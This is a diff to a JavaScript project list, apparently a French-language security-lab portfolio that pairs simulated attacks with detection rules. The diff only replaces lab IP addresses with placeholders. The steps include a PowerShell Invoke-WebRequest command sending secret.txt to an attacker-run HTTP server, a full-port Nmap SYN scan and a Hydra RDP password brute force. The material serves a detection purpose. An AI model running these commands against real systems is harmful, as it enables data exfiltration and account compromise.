@@ -74,7 +74,7 @@ const PROJECTS = [
     summary: "Données sensibles transmises depuis Windows Server via PowerShell vers un serveur HTTP sur Kali. Deux règles corrélées reconstituent la chaîne complète.",
     steps: [
       'python3 -m http.server 8888  (Kali)',
-      'Invoke-WebRequest -Uri http://192.168.56.100:8888 -InFile secret.txt  (WinServer2022)',
+      'Invoke-WebRequest -Uri http://[KALI]:8888 -InFile secret.txt  (WinServer2022)',
     ],
     detection: [
       'Rule 100010 niv.12  —  PowerShell: outbound network connection',
@@ -114,7 +114,7 @@ const PROJECTS = [
     summary: "Capture réseau avec tshark pendant un scan Nmap SYN stealth. 2117 paquets TCP SYN capturés. La signature est identifiable en quelques secondes dans le pcap.",
     steps: [
       'tshark -i eth1 -w capture.pcap  (Kali)',
-      'nmap -sS -p 1-65535 192.168.56.101  (Kali)',
+      'nmap -sS -p 1-65535 [SERVEUR]  (Kali)',
       'Analyse : SYN sans SYN-ACK → 2117 paquets → pattern scan',
     ],
     detection: [
@@ -181,9 +181,9 @@ const PROJECTS = [
     steps: [
       'Activer RDP sur la cible (fDenyTSConnections=0 + règle pare-feu)',
       "printf '...' > /tmp/pw.txt  (liste de mots de passe, Kali)",
-      'hydra -l hacktest -P /tmp/pw.txt rdp://192.168.56.101 -t 4 -V  (Kali)',
+      'hydra -l hacktest -P /tmp/pw.txt rdp://[SERVEUR] -t 4 -V  (Kali)',
       'Dashboard : Threat Hunting → rule.id:100014 → déplier l\'alerte',
-      "Investigation : rechercher un Event 4624 (succès) depuis 192.168.56.100",
+      "Investigation : rechercher un Event 4624 (succès) depuis [KALI]",
     ],
     detection: [
       'Rule 100014 niv.12  —  Brute force : 5 échecs en 30 s sur le même compte  [T1110]',
